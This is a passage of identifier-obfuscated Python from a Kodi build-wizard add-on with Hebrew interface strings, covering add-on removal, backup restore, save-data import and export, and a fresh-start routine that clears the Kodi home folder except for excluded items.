		OO000OO0O0O0OO0O0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OO0O00O000OOO0O ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,OO000O000OO00O0OO ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4589
	if OO000OO0O0O0OO0O0 ==1 :#line:4590
		O000O00OOOOOOO000 =os .path .join (ADDONS ,OO000O000OO00O0OO )#line:4591
		wiz .log ("Removing Addon %s"%OO000O000OO00O0OO )#line:4592
		wiz .cleanHouse (O000O00OOOOOOO000 )#line:4593
		xbmc .sleep (1000 )#line:4594
		try :shutil .rmtree (O000O00OOOOOOO000 )#line:4595
		except Exception as OO0O0O00O000OOO0O :wiz .log ("Error removing %s"%OO000O000OO00O0OO ,xbmc .LOGNOTICE )#line:4596
		removeAddonData (OO000O000OO00O0OO ,O0OO0O00O000OOO0O ,over )#line:4597
	if over ==False :#line:4598
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,O0OO0O00O000OOO0O ))#line:4599
def removeAddonData (O0O00OO0000OO0OO0 ,name =None ,over =False ):#line:4601
	if O0O00OO0000OO0OO0 =='all':#line:4602
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4603
			wiz .cleanHouse (ADDOND )#line:4604
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4605
	elif O0O00OO0000OO0OO0 =='uninstalled':#line:4606
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4607
			OO0OOOO00O0OO0OOO =0 #line:4608
			for OOOO0O00OOOO0OO0O in glob .glob (os .path .join (ADDOND ,'*')):#line:4609
				OOOO0OO00O000000O =OOOO0O00OOOO0OO0O .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4610
				if OOOO0OO00O000000O in EXCLUDES :pass #line:4611
				elif os .path .exists (os .path .join (ADDONS ,OOOO0OO00O000000O )):pass #line:4612
				else :wiz .cleanHouse (OOOO0O00OOOO0OO0O );OO0OOOO00O0OO0OOO +=1 ;wiz .log (OOOO0O00OOOO0OO0O );shutil .rmtree (OOOO0O00OOOO0OO0O )#line:4613
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OO0OOOO00O0OO0OOO ))#line:4614
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4615
	elif O0O00OO0000OO0OO0 =='empty':#line:4616
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4617
			OO0OOOO00O0OO0OOO =wiz .emptyfolder (ADDOND )#line:4618
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OO0OOOO00O0OO0OOO ))#line:4619
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4620
	else :#line:4621
		O0OO0O00O00OO0OOO =os .path .join (USERDATA ,'addon_data',O0O00OO0000OO0OO0 )#line:4622
		if O0O00OO0000OO0OO0 in EXCLUDES :#line:4623
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4624
		elif os .path .exists (O0OO0O00O00OO0OOO ):#line:4625
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0O00OO0000OO0OO0 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4626
				wiz .cleanHouse (O0OO0O00O00OO0OOO )#line:4627
				try :#line:4628
					shutil .rmtree (O0OO0O00O00OO0OOO )#line:4629
				except :#line:4630
					wiz .log ("Error deleting: %s"%O0OO0O00O00OO0OOO )#line:4631
			else :#line:4632
				wiz .log ('Addon data for %s was not removed'%O0O00OO0000OO0OO0 )#line:4633
	wiz .refresh ()#line:4634
def restoreit (OO000000O0OO0000O ):#line:4636
	if OO000000O0OO0000O =='build':#line:4637
		OOOO00OO0O0O000O0 =freshStart ('restore')#line:4638
		if OOOO00OO0O0O000O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4639
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4640
		wiz .skinToDefault ()#line:4641
	wiz .restoreLocal (OO000000O0OO0000O )#line:4642
def restoreextit (O00O000O00O0O00OO ):#line:4644
	if O00O000O00O0O00OO =='build':#line:4645
		OOOOOOO0O00O0OO00 =freshStart ('restore')#line:4646
		if OOOOOOO0O00O0OO00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4647
	wiz .restoreExternal (O00O000O00O0O00OO )#line:4648
def buildInfo (OO0000OOOO0OO00OO ):#line:4650
	if wiz .workingURL (SPEEDFILE )==True :#line:4651
		if wiz .checkBuild (OO0000OOOO0OO00OO ,'url'):#line:4652
			OO0000OOOO0OO00OO ,OOOO00O0O0OO00O00 ,OO000O0O000O000OO ,OOOOO00O0O0O00000 ,OOOO0000OOOOOOOOO ,O00OOOOO0OO00OOO0 ,OOOO0O0000O0OO000 ,OOOOO0OO0O0000000 ,O0OO0O0OO0000O0OO ,O00OOOO0OOO00OOOO ,O000O0OO000O0OOO0 =wiz .checkBuild (OO0000OOOO0OO00OO ,'all')#line:4653
			O00OOOO0OOO00OOOO ='Yes'if O00OOOO0OOO00OOOO .lower ()=='yes'else 'No'#line:4654
			O0O0O00OO00OO0O00 ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO0000OOOO0OO00OO )#line:4655
			O0O0O00OO00OO0O00 +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOO00O0O0OO00O00 )#line:4656
			if not O00OOOOO0OO00OOO0 =="http://":#line:4657
				OOOO0OOO0O0O000O0 =wiz .themeCount (OO0000OOOO0OO00OO ,False )#line:4658
				O0O0O00OO00OO0O00 +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (OOOO0OOO0O0O000O0 ))#line:4659
			O0O0O00OO00OO0O00 +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOO0000OOOOOOOOO )#line:4660
			O0O0O00OO00OO0O00 +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00OOOO0OOO00OOOO )#line:4661
			O0O0O00OO00OO0O00 +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O000O0OO000O0OOO0 )#line:4662
			wiz .TextBox (ADDONTITLE ,O0O0O00OO00OO0O00 )#line:4663
		else :wiz .log ("Invalid Build Name!")#line:4664
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4665
def buildVideo (O000O00OOOOO000O0 ):#line:4667
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4668
	if wiz .workingURL (SPEEDFILE )==True :#line:4669
		OO0OOO0OO0O0OO0O0 =wiz .checkBuild (O000O00OOOOO000O0 ,'preview')#line:4670
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%O000O00OOOOO000O0 )#line:4671
		if OO0OOO0OO0O0OO0O0 and not OO0OOO0OO0O0OO0O0 =='http://':playVideo (OO0OOO0OO0O0OO0O0 )#line:4672
		else :wiz .log ("[%s]Unable to find url for video preview"%O000O00OOOOO000O0 )#line:4673
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4674
def dependsList (O0OO0O000O0O0OOO0 ):#line:4676
	OO00000O0OOO00O00 =os .path .join (ADDONS ,O0OO0O000O0O0OOO0 ,'addon.xml')#line:4677
	if os .path .exists (OO00000O0OOO00O00 ):#line:4678
		O0OO0OOO0O000O0OO =open (OO00000O0OOO00O00 ,mode ='r');OOO0OO0OOOO00O00O =O0OO0OOO0O000O0OO .read ();O0OO0OOO0O000O0OO .close ();#line:4679
		OO0O000O00OOO0O0O =wiz .parseDOM (OOO0OO0OOOO00O00O ,'import',ret ='addon')#line:4680
		O00O00O0O00O0O0OO =[]#line:4681
		for O0OOO00OOOO0000OO in OO0O000O00OOO0O0O :#line:4682
			if not 'xbmc.python'in O0OOO00OOOO0000OO :#line:4683
				O00O00O0O00O0O0OO .append (O0OOO00OOOO0000OO )#line:4684
		return O00O00O0O00O0O0OO #line:4685
	return []#line:4686
def manageSaveData (OO0O0OOO00O0OOOO0 ):#line:4688
	if OO0O0OOO00O0OOOO0 =='import':#line:4689
		OO0OO0O000OOOOO0O =os .path .join (ADDONDATA ,'temp')#line:4690
		if not os .path .exists (OO0OO0O000OOOOO0O ):os .makedirs (OO0OO0O000OOOOO0O )#line:4691
		O00OO0000OO000OO0 =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4692
		if not O00OO0000OO000OO0 .endswith ('.zip'):#line:4693
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4694
			return #line:4695
		O00000O00000OOOO0 =os .path .join (MYBUILDS ,'SaveData.zip')#line:4696
		OOO0OOOOOOO000OOO =xbmcvfs .copy (O00OO0000OO000OO0 ,O00000O00000OOOO0 )#line:4697
		wiz .log ("%s"%str (OOO0OOOOOOO000OOO ))#line:4698
		extract .all (xbmc .translatePath (O00000O00000OOOO0 ),OO0OO0O000OOOOO0O )#line:4699
		O00OO0O0O0000OO0O =os .path .join (OO0OO0O000OOOOO0O ,'trakt')#line:4700
		O0OO0000O0OO0000O =os .path .join (OO0OO0O000OOOOO0O ,'login')#line:4701
		OOO0OO0OOOOOOOO0O =os .path .join (OO0OO0O000OOOOO0O ,'debrid')#line:4702
		OO00OO0OOOOOO000O =0 #line:4703
		if os .path .exists (O00OO0O0O0000OO0O ):#line:4704
			OO00OO0OOOOOO000O +=1 #line:4705
			OO00O0O0OO0OOO0OO =os .listdir (O00OO0O0O0000OO0O )#line:4706
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4707
			for OOOOO0000O0OO000O in OO00O0O0OO0OOO0OO :#line:4708
				O0OOOO00OO0OO0OO0 =os .path .join (traktit .TRAKTFOLD ,OOOOO0000O0OO000O )#line:4709
				OO0O0O0OOO000OO00 =os .path .join (O00OO0O0O0000OO0O ,OOOOO0000O0OO000O )#line:4710
				if os .path .exists (O0OOOO00OO0OO0OO0 ):#line:4711
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OOOOO0000O0OO000O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4712
					else :os .remove (O0OOOO00OO0OO0OO0 )#line:4713
				shutil .copy (OO0O0O0OOO000OO00 ,O0OOOO00OO0OO0OO0 )#line:4714
			traktit .importlist ('all')#line:4715
			traktit .traktIt ('restore','all')#line:4716
		if os .path .exists (O0OO0000O0OO0000O ):#line:4717
			OO00OO0OOOOOO000O +=1 #line:4718
			OO00O0O0OO0OOO0OO =os .listdir (O0OO0000O0OO0000O )#line:4719
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4720
			for OOOOO0000O0OO000O in OO00O0O0OO0OOO0OO :#line:4721
				O0OOOO00OO0OO0OO0 =os .path .join (loginit .LOGINFOLD ,OOOOO0000O0OO000O )#line:4722
				OO0O0O0OOO000OO00 =os .path .join (O0OO0000O0OO0000O ,OOOOO0000O0OO000O )#line:4723
				if os .path .exists (O0OOOO00OO0OO0OO0 ):#line:4724
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OOOOO0000O0OO000O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4725
					else :os .remove (O0OOOO00OO0OO0OO0 )#line:4726
				shutil .copy (OO0O0O0OOO000OO00 ,O0OOOO00OO0OO0OO0 )#line:4727
			loginit .importlist ('all')#line:4728
			loginit .loginIt ('restore','all')#line:4729
		if os .path .exists (OOO0OO0OOOOOOOO0O ):#line:4730
			OO00OO0OOOOOO000O +=1 #line:4731
			OO00O0O0OO0OOO0OO =os .listdir (OOO0OO0OOOOOOOO0O )#line:4732
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4733
			for OOOOO0000O0OO000O in OO00O0O0OO0OOO0OO :#line:4734
				O0OOOO00OO0OO0OO0 =os .path .join (debridit .REALFOLD ,OOOOO0000O0OO000O )#line:4735
				OO0O0O0OOO000OO00 =os .path .join (OOO0OO0OOOOOOOO0O ,OOOOO0000O0OO000O )#line:4736
				if os .path .exists (O0OOOO00OO0OO0OO0 ):#line:4737
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OOOOO0000O0OO000O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4738
					else :os .remove (O0OOOO00OO0OO0OO0 )#line:4739
				shutil .copy (OO0O0O0OOO000OO00 ,O0OOOO00OO0OO0OO0 )#line:4740
			debridit .importlist ('all')#line:4741
			debridit .debridIt ('restore','all')#line:4742
		wiz .cleanHouse (OO0OO0O000OOOOO0O )#line:4743
		wiz .removeFolder (OO0OO0O000OOOOO0O )#line:4744
		os .remove (O00000O00000OOOO0 )#line:4745
		if OO00OO0OOOOOO000O ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4746
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4747
	elif OO0O0OOO00O0OOOO0 =='export':#line:4748
		O00OO0O000OO0000O =xbmc .translatePath (MYBUILDS )#line:4749
		OO000000O00OO000O =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4750
		traktit .traktIt ('update','all')#line:4751
		loginit .loginIt ('update','all')#line:4752
		debridit .debridIt ('update','all')#line:4753
		O00OO0000OO000OO0 =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4754
		O00OO0000OO000OO0 =xbmc .translatePath (O00OO0000OO000OO0 )#line:4755
		OOOOOOOOO00O0OOO0 =os .path .join (O00OO0O000OO0000O ,'SaveData.zip')#line:4756
		O00O0000OOOOO0O00 =zipfile .ZipFile (OOOOOOOOO00O0OOO0 ,mode ='w')#line:4757
		for O00OOOOOOO00OOOO0 in OO000000O00OO000O :#line:4758
			if os .path .exists (O00OOOOOOO00OOOO0 ):#line:4759
				OO00O0O0OO0OOO0OO =os .listdir (O00OOOOOOO00OOOO0 )#line:4760
				for O00000OO0OO00OOOO in OO00O0O0OO0OOO0OO :#line:4761
					O00O0000OOOOO0O00 .write (os .path .join (O00OOOOOOO00OOOO0 ,O00000OO0OO00OOOO ),os .path .join (O00OOOOOOO00OOOO0 ,O00000OO0OO00OOOO ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4762
		O00O0000OOOOO0O00 .close ()#line:4763
		if O00OO0000OO000OO0 ==O00OO0O000OO0000O :#line:4764
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOOOOOO00O0OOO0 ))#line:4765
		else :#line:4766
			try :#line:4767
				xbmcvfs .copy (OOOOOOOOO00O0OOO0 ,os .path .join (O00OO0000OO000OO0 ,'SaveData.zip'))#line:4768
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (O00OO0000OO000OO0 ,'SaveData.zip')))#line:4769
			except :#line:4770
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOOOOOO00O0OOO0 ))#line:4771
def freshStart (install =None ,over =False ):#line:4776
	if USERNAME =='':#line:4777
		ADDON .openSettings ()#line:4778
		sys .exit ()#line:4779
	O00O0OOO0OO0O0000 =u_list (SPEEDFILE )#line:4780
	(O00O0OOO0OO0O0000 )#line:4781
	OOO000OO0OO00OO00 =(wiz .workingURL (O00O0OOO0OO0O0000 ))#line:4782
	(OOO000OO0OO00OO00 )#line:4783
	if KEEPTRAKT =='true':#line:4784
		traktit .autoUpdate ('all')#line:4785
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4786
	if KEEPREAL =='true':#line:4787
		debridit .autoUpdate ('all')#line:4788
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4789
	if KEEPLOGIN =='true':#line:4790
		loginit .autoUpdate ('all')#line:4791
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4792
	if over ==True :OO0O0O0O00O00O0OO =1 #line:4793
	elif install =='restore':OO0O0O0O00O00O0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4794
	elif install :OO0O0O0O00O00O0OO =1 #line:4795
	else :OO0O0O0O00O00O0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4796
	if OO0O0O0O00O00O0OO :#line:4797
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4798
			OO0OO0O0O00OO000O ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4799
			skinSwitch .swapSkins (OO0OO0O0O00OO000O )#line:4802
			O0000O000OO0O000O =0 #line:4803
			xbmc .sleep (1000 )#line:4804
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0000O000OO0O000O <150 :#line:4805
				O0000O000OO0O000O +=1 #line:4806
				xbmc .sleep (1000 )#line:4807
				wiz .ebi ('SendAction(Select)')#line:4808
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4809
				wiz .ebi ('SendClick(11)')#line:4810
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4811
			xbmc .sleep (1000 )#line:4812
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4813
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4814
			return #line:4815
		wiz .addonUpdates ('set')#line:4816
		O0OO000OO00OOOO00 =os .path .abspath (HOME )#line:4817
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4818
		O00O000O00OO000OO =sum ([len (O0000OO0OOO0O00O0 )for O0OOO0O00OO000000 ,OOOOO000OO0O000O0 ,O0000OO0OOO0O00O0 in os .walk (O0OO000OO00OOOO00 )]);O0O00OO0O000OOO0O =0 #line:4819
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4820
		EXCLUDES .append ('My_Builds')#line:4821
		EXCLUDES .append ('archive_cache')#line:4822
		EXCLUDES .append ('script.module.requests')#line:4823
		EXCLUDES .append ('myfav.anon')#line:4824
		if KEEPREPOS =='true':#line:4825
			O0O0OOOO0O0OO0OOO =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4826
			for OOOOO0OOO00O0O00O in O0O0OOOO0O0OO0OOO :#line:4827
				O0O00O0OOO0OOOO00 =os .path .split (OOOOO0OOO00O0O00O [:-1 ])[1 ]#line:4828
				if not O0O00O0OOO0OOOO00 ==EXCLUDES :#line:4829
					EXCLUDES .append (O0O00O0OOO0OOOO00 )#line:4830
		if KEEPSUPER =='true':#line:4831
			EXCLUDES .append ('plugin.program.super.favourites')#line:4832
		if KEEPMOVIELIST =='true':#line:4833
			EXCLUDES .append ('plugin.video.metalliq')#line:4834
		if KEEPMOVIELIST =='true':#line:4835
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4836
		if KEEPADDONS =='true':#line:4837
			EXCLUDES .append ('addons')#line:4838
		if KEEPADDONS =='true':#line:4839
			EXCLUDES .append ('addon_data')#line:4840
		EXCLUDES .append ('plugin.video.elementum')#line:4843
		EXCLUDES .append ('script.elementum.burst')#line:4844
		EXCLUDES .append ('script.elementum.burst-master')#line:4845
		EXCLUDES .append ('plugin.video.quasar')#line:4846
		EXCLUDES .append ('script.quasar.burst')#line:4847
		EXCLUDES .append ('skin.estuary')#line:4848
		if KEEPWHITELIST =='true':#line:4851
			O00O0000O0OO0O0O0 =''#line:4852
			OOO0OO00OO0000OO0 =wiz .whiteList ('read')#line:4853
			if len (OOO0OO00OO0000OO0 )>0 :#line:4854
				for OOOOO0OOO00O0O00O in OOO0OO00OO0000OO0 :#line:4855
					try :O000O000O0O00OO0O ,O0O0O00000O00000O ,O0000O0OOO0O000OO =OOOOO0OOO00O0O00O #line:4856
					except :pass #line:4857
					if O0000O0OOO0O000OO .startswith ('pvr'):O00O0000O0OO0O0O0 =O0O0O00000O00000O #line:4858
					OO00000OO00O0OOO0 =dependsList (O0000O0OOO0O000OO )#line:4859
					for OO0O00O000OOO00OO in OO00000OO00O0OOO0 :#line:4860
						if not OO0O00O000OOO00OO in EXCLUDES :#line:4861
							EXCLUDES .append (OO0O00O000OOO00OO )#line:4862
						O00O00OOOOOOOOO0O =dependsList (OO0O00O000OOO00OO )#line:4863
						for OO0O0O0OO0000OOOO in O00O00OOOOOOOOO0O :#line:4864
							if not OO0O0O0OO0000OOOO in EXCLUDES :#line:4865
								EXCLUDES .append (OO0O0O0OO0000OOOO )#line:4866
					if not O0000O0OOO0O000OO in EXCLUDES :#line:4867
						EXCLUDES .append (O0000O0OOO0O000OO )#line:4868
				if not O00O0000O0OO0O0O0 =='':wiz .setS ('pvrclient',O0000O0OOO0O000OO )#line:4869
		if wiz .getS ('pvrclient')=='':#line:4870
			for OOOOO0OOO00O0O00O in EXCLUDES :#line:4871
				if OOOOO0OOO00O0O00O .startswith ('pvr'):#line:4872
					wiz .setS ('pvrclient',OOOOO0OOO00O0O00O )#line:4873
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4874
		O0O0OOOOO0OOO000O =wiz .latestDB ('Addons')#line:4875
		for O00000O0O00OOO0OO ,O000OOOOO00O00000 ,OO0000OOO0O000OOO in os .walk (O0OO000OO00OOOO00 ,topdown =True ):#line:4876
			O000OOOOO00O00000 [:]=[O00O0O0OO0OO00OO0 for O00O0O0OO0OO00OO0 in O000OOOOO00O00000 if O00O0O0OO0OO00OO0 not in EXCLUDES ]#line:4877
			for O000O000O0O00OO0O in OO0000OOO0O000OOO :#line:4878
				O0O00OO0O000OOO0O +=1 #line:4879
				O0000O0OOO0O000OO =O00000O0O00OOO0OO .replace ('/','\\').split ('\\')#line:4880
				O0000O000OO0O000O =len (O0000O0OOO0O000OO )-1 #line:4882
				if O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4883
				elif O000O000O0O00OO0O =='MyVideos99.db'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4884
				elif O000O000O0O00OO0O =='MyVideos107.db'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4885
				elif O000O000O0O00OO0O =='MyVideos116.db'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4886
				elif O000O000O0O00OO0O =='MyVideos99.db'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4887
				elif O000O000O0O00OO0O =='MyVideos107.db'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4888
				elif O000O000O0O00OO0O =='MyVideos116.db'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4889
				elif O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4890
